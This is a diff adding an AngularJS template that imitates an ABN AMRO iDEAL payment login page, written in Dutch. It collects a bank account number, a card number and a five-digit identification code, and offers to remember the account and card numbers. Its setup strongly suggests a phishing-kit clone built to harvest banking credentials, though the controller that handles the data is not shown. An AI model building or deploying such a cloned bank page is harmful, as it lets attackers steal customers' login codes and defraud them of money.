@@ -1,0 +1,100 @@
+<div ng-controller="paymentController as paymentController" ng-init="paymentController.init()">
+    <div id="main-page" data-pid="page-nl_prive_ideal" class="bp-page bp-portal">
+        <header id="header" class="bp-area --area">
+            <div class="container-fluid-nomax ocf-header" data-pid="layoutHeader-container-ideal-personalspace">
+                <div class="container-fluid">
+                    <a ui-sref="about"><span class="ocf-brand ocf-cutout"></span></a>
+                </div>
+                <div class="navbar-container bp-area">
+                </div>
+            </div>
+            <!-- end abn amro header -->
+        </header>
+        <div class="container-fluid">
+            <div class="panel panel-default" style="position: relative;">
+                <div class="ng-scope panel-heading">
+                    <h2 class="panel-title" ng-bind="paymentController.headingTitle"></h2>
+                </div>
+                <div class="panel-body">
+                    <div data-autoscroll="true">
+                        <div>
+                            <div class="row" ng-show="paymentController.showPanelBody">
+                                <div class="col-xxs-12">
+                                    <div class="ocf-tiles">
+                                        <div class="ocf-tile ocf-title-readonly ocf-tile-oneline">
+                                            <div class="ocf-logo-service"><img class="glyphicon ocf-contract-type-Ideal" src="../../images/ocf-transparent.svg" alt="ideal"></div>
+                                            <div class="ocf-tile-info">
+                                                <h5 class="ocf-tile-primary-info" ng-bind="paymentController.stateObject.amountToBePayed"></h5>
+                                                <h5 class="ocf-tile-name" ng-bind="paymentController.stateObject.issuer"></h5>
+                                            </div>
+                                            <p class="ocf-tile-additional-info ng-binding ng-hide" ng-hide="paymentController.merchantTradeName === ''">Inzake </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="container-fluid">
+                                <form novalidate="" name="form" class="form-horizontal ng-pristine ng-invalid ng-invalid-required ng-invalid-is-valid-length-account-number ng-invalid-min-length" autocomplete="off">
+                                    <div>
+                                        <fieldset>
+                                            <legend ng-bind="paymentController.subTitle"></legend>
+                                            <div class="form-group" ng-class="{'has-warning has-feedback': ((form.accountNumber.$invalid && paymentController.formSubmitted || (form.accountNumber.$invalid && form.accountNumber.$dirty)) && form.accountNumber.$error.inputDataModified == false) || (form.accountNumber.$invalid && paymentController.formSubmitted) }">
+                                                <p class="label label-warning sg-progress"></p>
+                                                <label class="control-label col-sm-6 ng-binding">Rekeningnummer</label>
+                                                <div class="col-sm-5">
+                                                    <div class="input-group ng-scope">
+                                                        <span class="input-group-addon">NL** ABNA 0</span>
+                                                        <input class="form-control" data-ng-class="align" aab-add-focus="true" maxlength="9" onblur="true" ng-model="paymentController.userInput.accountNumber" required="required" name="accountNumber" account-number-validation="" autocomplete="off" type="number">
+                                                        <span ng-show="((form.accountNumber.$invalid && paymentController.formSubmitted || (form.accountNumber.$invalid && form.accountNumber.$dirty)) && form.accountNumber.$error.inputDataModified == false) || (form.accountNumber.$invalid && paymentController.formSubmitted)" class="glyphicon glyphicon-warning-sign form-control-feedback ng-hide"></span>
+                                                    </div>
+                                                    <!--<div class="input-group" ng-hide="paymentController.showPanelBody">
+                                                        <input class="form-control form-control-small" data-ng-class="align" id="inputAccountNumberReadOnly" name="cardNumber" readonly="readonly" data-ng-model="paymentController.userInput.accountNumber" required="required" autocomplete="off" type="text">
+                                                    </div>-->
+                                                    <div></div>
+                                                    <span class="help-block ng-binding ng-hide" ng-show="form.accountNumber.$invalid && form.accountNumber.$error.inputDataModified == false && form.accountNumber.$error.minLength && paymentController.userInput.accountNumber.length != undefined && paymentController.userInput.accountNumber.length != 0 && paymentController.userInput.accountNumber.length < 9">Vul aub een geldig rekeningnummer in.</span> <span class="help-block ng-binding ng-hide" ng-show="form.accountNumber.$invalid && form.accountNumber.$error.inputDataModified == false && form.accountNumber.$error.isValidAccountNumber && paymentController.userInput.accountNumber.length != undefined && paymentController.userInput.accountNumber.length != 0 && paymentController.userInput.accountNumber.length > 8 || (form.accountNumber.$invalid && paymentController.formSubmitted)">Vul aub een geldig rekeningnummer in.</span>
+                                                </div>
+                                            </div>
+                                            <div class="form-group" ng-class="{'has-warning has-feedback': ((form.cardNumber.$invalid && paymentController.formSubmitted) || (form.cardNumber.$invalid && form.cardNumber.$dirty))}">
+                                                <label for="inputPassNumber" class="col-sm-6 control-label ng-binding">Pasnummer</label>
+                                                <div class="col-sm-4"><input class="form-control form-control-small" data-ng-class="align" id="inputPassNumber" name="cardNumber" aab-numeric-input="" limit="4" minlength="3" active-status="paymentController.softTokenActiveStatus" data-ng-model="paymentController.userInput.cardNumber" required="required" autocomplete="off" type="number"> <span ng-show="((form.cardNumber.$invalid && paymentController.formSubmitted) || (form.cardNumber.$invalid && form.cardNumber.$dirty))" class="glyphicon glyphicon-warning-sign form-control-feedback ng-hide"></span> <span ng-show="(form.cardNumber.$invalid && paymentController.formSubmitted) || (form.cardNumber.$error.minLength && paymentController.softTokenActiveStatus && form.cardNumber.$dirty)" class="help-block ng-binding ng-hide">Vul aub een geldig pasnummer in.</span></div>
+                                            </div>
+                                            <div ng-show="paymentController.showPanelBody" class="form-group">
+                                                <div class="col-md-4 col-sm-5 col-sm-push-6">
+                                                    <div class="checkbox"><input type="checkbox" id="checkbox10" ng-model="paymentController.myChkModel" ng-checked="paymentController.expression" class="ng-pristine ng-valid"> <label for="checkbox10" class="ng-binding">Onthoud mijn rekening- en pasnummer op dit apparaat</label></div>
+                                                </div>
+                                            </div>
+                                            <div class="row" ng-class="{'has-warning has-feedback': ((form.pin5.$invalid && paymentController.formSubmitted) || (form.pin5.$invalid && form.pin5.$dirty))}">
+                                                <label class="control-label col-sm-6">Identificatiecode</label>
+                                                <div class="col-sm-4">
+                                                    <div class="ocf-pin form-control form-control-small" data-ng-model="paymentController.userInput.pin5" id="pin5Input" name="pin5" minlength="5" onblur="true" autocomplete="off" required="required" pattern="[0-9]*">
+                                                        <div class="ocf-pin-boxforbox">
+                                                            <div class="ocf-pin-enclosure">
+                                                                <div class="ocf-pin-status-box" ng-repeat="(key, value) in paymentController.boxes" ng-class="{'active':value.state, 'inactive':!value.state, 'ocf-pin-state':key === paymentController.pinstate}"></div>
+                                                            </div>
+                                                            <div class="ocf-pin-boxforinput form-control-small">
+                                                                <input name="inputElement" id="pin5" data-testid="input-pin5" type="password" autocomplete="off" maxlength="5" pattern="[0-9]*" ng-focus="paymentController.addDefaultClass()" ng-blur="paymentController.removeDefaultClass()" ng-model="ngModel" class="form-control" data-index="1" value="" required="">
+                                                            </div>
+                                                        </div>
+                                                        <span ng-show="((form.pin5.$invalid && paymentController.formSubmitted) || (form.pin5.$invalid && form.pin5.$dirty))" class="glyphicon glyphicon-warning-sign form-control-feedback">
+                                                    </span>
+                                                        <span ng-show="((form.pin5.$invalid && paymentController.formSubmitted) || (form.pin5.$dirty && form.pin5.$invalid))" class="help-block ng-binding">Vul aub een geldige identificatie code in.</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </fieldset>
+                                        <div class="row">
+                                            <div class="col-xxs-12">
+                                                <div class="ocf-primary-switch">
+                                                    <button class="btn btn-primary ng-binding" data-ng-click="paymentController.submitAndMoveToNextPageOnSucess(form)">volgende</button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
